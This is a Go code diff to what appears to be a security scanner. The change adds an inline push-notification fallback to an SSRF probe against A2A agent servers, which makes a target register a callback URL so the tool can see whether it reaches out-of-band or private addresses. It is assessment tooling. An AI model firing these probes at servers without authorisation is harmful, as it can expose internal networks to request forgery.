@@ -216,6 +216,23 @@ func (e *PushSSRFExecutor) Execute(ctx context.Context, target string, opts atta
 			}
 		}
 	}
+	if !taskAccepted && listener != nil {
+		inlineID := "batesian-sm-inline-" + vars.RandID
+		inlineResp, inlineErr := client.POST(ctx, endpoint, a2aHeaders,
+			buildV1InlineSendRequest(callbackURL, token, "", vars.RandID))
+		if inlineErr == nil && inlineResp != nil && inlineResp.StatusCode != 404 {
+			reached = true
+		}
+		inlineTaskID := pushTaskReplyID(inlineResp, inlineID)
+		if inlineErr == nil && inlineTaskID != "" {
+			taskAccepted = true
+			acceptedBinding = "JSONRPC/v1.0-SendMessage-inline"
+			recordPossiblePushConfig(opts.TargetState, endpoint, inlineTaskID)
+		} else {
+			obs.observe(pushTaskSetupOutcome("sending a task with inline push configuration", endpoint,
+				credentialed, inlineResp, inlineID))
+		}
+	}
 
 	if !taskAccepted {
 		// Target doesn't accept A2A task requests. If nothing was reachable at all,
@@ -268,7 +285,7 @@ func (e *PushSSRFExecutor) Execute(ctx context.Context, target string, opts atta
 		// A public callback does not prove private reachability.
 	} else {
 		if !registrationConfirmed && !opts.DryRun {
-			return nil, fmt.Errorf("%w: push config was sent inline, but registration was not confirmed by tasks/pushNotificationConfig/set", attack.ErrInconclusive)
+			return nil, fmt.Errorf("%w: inline push registration was not confirmed and delivery was not observed", attack.ErrInconclusive)
 		}
 		// Using external OOB - report task accepted, user must check their OOB server.
 		findings = append(findings, attack.Finding{
@@ -321,11 +338,30 @@ func privatePushCallbackURL(rawURL string) bool {
 	return ip.IsPrivate() || ip.IsLoopback() || ip.IsLinkLocalUnicast() || ip.IsUnspecified()
 }
 
-// buildV03SendRequest creates a v0.3 message/send carrying the push callback in
-// the configuration block, which is where that revision puts it. There is no
-// equivalent on the v1.0 side: SendMessageConfiguration has no
-// pushNotificationConfig field, so v1.0 registers the callback only through the
-// separate CreateTaskPushNotificationConfig call.
+func buildV1InlineSendRequest(callbackURL, token, credential, randID string) map[string]interface{} {
+	config := map[string]interface{}{"url": callbackURL, "token": token}
+	if credential != "" {
+		config["authentication"] = map[string]string{"scheme": "Bearer", "credentials": credential}
+	}
+	return map[string]interface{}{
+		"jsonrpc": "2.0",
+		"id":      "batesian-sm-inline-" + randID,
+		"method":  "SendMessage",
+		"params": map[string]interface{}{
+			"configuration": map[string]interface{}{
+				"returnImmediately":          true,
+				"taskPushNotificationConfig": config,
+			},
+			"message": map[string]interface{}{
+				"role":      "ROLE_USER",
+				"parts":     []interface{}{map[string]string{"text": "ping"}},
+				"messageId": "batesian-inline-" + randID,
+			},
+		},
+	}
+}
+
+// buildV03SendRequest creates a v0.3 message/send with an inline callback.
 func buildV03SendRequest(callbackURL, token, randID string) map[string]interface{} {
 	return map[string]interface{}{
 		"jsonrpc": "2.0",
